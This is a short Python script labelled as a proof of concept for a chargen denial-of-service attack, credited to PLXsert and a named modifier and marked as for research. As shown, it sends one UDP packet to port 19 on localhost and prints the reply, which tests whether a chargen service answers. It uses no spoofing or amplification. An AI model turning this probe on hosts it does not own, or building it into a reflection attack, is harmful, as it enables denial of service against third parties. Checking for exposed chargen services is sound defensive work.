 
#Chargen Attack POC
#PLXsert - King Tuna
#Modified by Rod Soto @rodsoto 
#For research purposes, this will not build you a botnet ;)
 
import socket
s = socket.socket(socket.AF_INET,  socket.SOCK_DGRAM)
MSG = 'Chargen DOS'
HOSTNAME = '127.0.0.1'
PORTNO = 19
s.connect((HOSTNAME, PORTNO))
if len(MSG) != s.send(MSG):
        print "cannot send %s(%d):" % (HOSTNAME,PORTNO)
        raise SystemExit(1)
MAXLEN = 4098
(data,addr) = s.recvfrom(MAXLEN)
s.close()
print '%s(%d) said "%s"' % (addr[0],addr[1], data)
